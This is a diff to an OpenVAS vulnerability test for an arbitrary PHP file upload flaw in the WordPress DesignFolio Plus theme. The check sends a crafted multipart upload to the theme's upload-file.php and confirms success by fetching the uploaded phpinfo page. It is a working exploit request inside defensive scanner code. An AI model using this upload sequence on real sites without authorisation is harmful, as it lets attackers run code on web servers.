@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_designfolio_arbit_file_upload_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
+# $Id: gb_wordpress_designfolio_arbit_file_upload_vuln.nasl 13997 2019-03-05 12:43:01Z cfischer $
 #
 # Wordpress DesignFolio Plus Theme Arbitrary File Upload Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805156");
-  script_version("$Revision: 13659 $");
+  script_version("$Revision: 13997 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:43:01 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2015-03-18 14:31:11 +0530 (Wed, 18 Mar 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Wordpress DesignFolio Plus Theme Arbitrary File Upload Vulnerability");
@@ -51,9 +51,9 @@ if(description)
   script_tag(name:"affected", value:"Wordpress DesignFolio Plus Theme
   version 1.2, Prior version may also be affected.");
 
-  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
-Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
+  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
+  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
   script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36372");
@@ -63,35 +63,34 @@ General solution options are to upgrade to a newer release, disable respective f
   script_dependencies("secpod_wordpress_detect_900182.nasl");
   script_mandatory_keys("wordpress/installed");
   script_require_ports("Services/www", 80);
+
   exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-if(!http_port = get_app_port(cpe:CPE)){
+if(!http_port = get_app_port(cpe:CPE))
   exit(0);
-}
 
-if(!dir = get_app_location(cpe:CPE, port:http_port)){
+if(!dir = get_app_location(cpe:CPE, port:http_port))
   exit(0);
-}
 
-## Plugin URL
+host = http_host_name(port:http_port);
 url = dir + '/wp-content/themes/designfolio-plus/admin/upload-file.php';
-wpReq = http_get(item: url,  port:http_port);
+wpReq = http_get(item: url, port:http_port);
 wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:FALSE);
-vtstring = get_vt_string( lowercase:TRUE );
-useragent = http_get_user_agent();
 
-if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
+if(wpRes && wpRes =~ "^HTTP/1\.[01] 200")
 {
+
+  vtstrings = get_vt_strings();
+  useragent = http_get_user_agent();
   index = eregmatch(pattern:'Undefined index: ([0-9a-z]+) in', string:wpRes);
 
-  fileName = vtstring + '_' + rand() + '.php';
+  fileName = vtstrings["lowercase_rand"] + ".php";
 
   postData = string('------------7nLRJ4OOOKgWZky9bsIqMS\r\n',
                     'Content-Disposition: form-data; name="', index[1], '"; filename="', fileName, '"\r\n',
@@ -102,7 +101,7 @@ if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
                     'Li4vLi4vLi4vLi4v\r\n', '------------7nLRJ4OOOKgWZky9bsIqMS--');
 
   sndReq = string("POST ", url, " HTTP/1.1\r\n",
-                  "Host: ", get_host_name(), "\r\n",
+                  "Host: ", host, "\r\n",
                   "User-Agent: ", useragent, "\r\n",
                   "Content-Length: ", strlen(postData), "\r\n",
                   "Content-Type: multipart/form-data; boundary=----------7nLRJ4OOOKgWZky9bsIqMS\r\n\r\n",
@@ -110,16 +109,14 @@ if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
 
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  if('success' >< rcvRes && rcvRes =~ "HTTP/1.. 200 OK")
+  if('success' >< rcvRes && rcvRes =~ "^HTTP/1\.[01] 200")
   {
-    ## Uploaded file URL
     url = dir + "/" + fileName;
-
     if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
        pattern:">phpinfo\(\)<", extra_check:">System"))
     {
       if(http_vuln_check(port:http_port, url:url,
-         check_header:FALSE, pattern:"HTTP/1.. 200 OK"))
+         check_header:FALSE, pattern:"^HTTP/1\.[01] 200"))
       {
         report = "\nUnable to Delete the uploaded File at " + url + "\n";
       }
